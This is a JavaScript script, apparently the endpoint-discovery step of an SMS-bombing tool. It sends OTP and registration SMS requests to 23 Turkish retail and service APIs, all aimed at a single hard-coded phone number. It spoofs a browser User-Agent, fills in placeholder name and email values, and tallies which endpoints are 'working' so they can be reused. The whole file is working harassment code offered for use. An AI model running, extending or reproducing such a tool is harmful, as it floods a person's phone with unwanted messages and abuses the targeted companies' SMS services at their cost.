import axios from 'axios';
const ph = '5343622375';

const MORE = [
  { id: 'bim', url: 'https://bim.com.tr/api/v1/user/register/otp', p: { phone: '90' + ph } },
  { id: 'e_bebek', url: 'https://www.e-bebek.com/api/v1/auth/register/send-otp', p: { phone: ph, email: 'test@test.com' } },
  { id: 'onur_market', url: 'https://www.onurmarket.com/api/v1/auth/register/sendOtp', p: { phone: ph } },
  { id: 'sportive', url: 'https://www.sportive.com.tr/api/v1/auth/register/send-otp', p: { phone: ph } },
  { id: 'gamegaraj', url: 'https://www.gamegaraj.com/api/v1/auth/register/sendOtp', p: { phone: ph, email: 'test@test.com' } },
  { id: 'bkm_kitap', url: 'https://www.bkmkitap.com/api/member/register/sendOtp', p: { phone: '0' + ph, email: 'test@test.com' } },
  { id: 'joker', url: 'https://www.joker.com.tr/api/auth/otp/send', p: { phone: ph } },
  { id: 'cineverse', url: 'https://api.cineverse.com.tr/api/v1/auth/register/otp', p: { phoneNumber: ph } },
  { id: 'akasya_avm', url: 'https://api.akasyaavm.com/api/v1/auth/send-otp', p: { phone: ph } },
  { id: 'yuffi', url: 'https://api.yuffi.com.tr/api/auth/register/otp', p: { phone: ph, name: 'Test Name' } },
  {
    id: 'tasimacim',
    url: 'https://api.tasimacim.com/api/v1/auth/register/otp',
    p: { phone: ph, name: 'Test Name', email: 'test@test.com' },
  },
  { id: 'naosstars', url: 'https://www.naosstars.com/api/auth/register/sendOtp', p: { phone: ph, email: 'test@test.com' } },
  { id: 'tazi', url: 'https://api.tazi.com.tr/api/v1/auth/register/sendOtp', p: { phone: ph } },
  { id: 'bisu', url: 'https://api.bisu.com.tr/api/v1/auth/otp/send', p: { phoneNumber: '+90' + ph } },
  { id: 'orwi', url: 'https://api.orwi.com.tr/api/v1/auth/register/otp', p: { phoneNumber: '90' + ph } },
  { id: 'pidem', url: 'https://api.pidem.com.tr/api/v1/auth/otp/send', p: { phone: ph } },
  { id: 'frink', url: 'https://api.frink.com.tr/api/auth/send-otp', p: { phone: ph } },
  { id: 'tasdelen_su', url: 'https://api.tasdelensu.com.tr/api/auth/register/sendSms', p: { phone: ph } },
  { id: 'iste_gelsin', url: 'https://api.istegelsin.com/api/v1/auth/otp/send', p: { phone: '90' + ph } },
  { id: 'clickme_live', url: 'https://api.clickmelive.com/api/v1/auth/otp/send', p: { phoneNumber: '90' + ph } },
  { id: 'hizli_ecza', url: 'https://api.hizliecza.com/api/v1/auth/register/otp', p: { phone: ph, email: 'test@test.com' } },
  {
    id: 'forever_living',
    url: 'https://www.foreverliving.com.tr/api/v1/auth/register/sendOtp',
    p: { phone: ph, email: 'test@test.com', name: 'Test Name' },
  },
  {
    id: 'herbalife',
    url: 'https://www.herbalife.com.tr/api/v1/auth/register/sendOtp',
    p: { phone: ph, email: 'test@test.com', name: 'Test Name' },
  },
];

console.log('=== FINDING MORE WORKING ENDPOINTS ===\n');
let working = [];

for (const t of MORE) {
  process.stdout.write(t.id.padEnd(20));
  try {
    const r = await axios.post(t.url, t.p, {
      timeout: 8000,
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Content-Type': 'application/json' },
      validateStatus: () => true,
    });
    if (r.status >= 200 && r.status < 400) {
      const body = JSON.stringify(r.data).substring(0, 100);
      console.log('✅ ' + r.status + ' ' + body);
      working.push(t.id);
    } else if (r.status === 400) {
      console.log('  400 (reachable)');
      working.push(t.id);
    } else if (r.status === 405) {
      console.log('  405 (exists)');
      working.push(t.id);
    } else {
      console.log('  ' + r.status);
    }
  } catch (e) {
    if (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND' || e.code === 'ENETUNREACH') console.log('  ❌ UNREACHABLE');
    else if (e.code === 'ECONNABORTED') console.log('  ⏱ TIMEOUT');
    else if (e.code === 'EPROTO') console.log('  ⚠️ SSL');
    else console.log('  ERR ' + e.message.substring(0, 50));
  }
}

console.log('\n\n=== WORKING / REACHABLE ===');
working.forEach(w => console.log('  ✅ ' + w));
console.log('\nFound: ' + working.length);
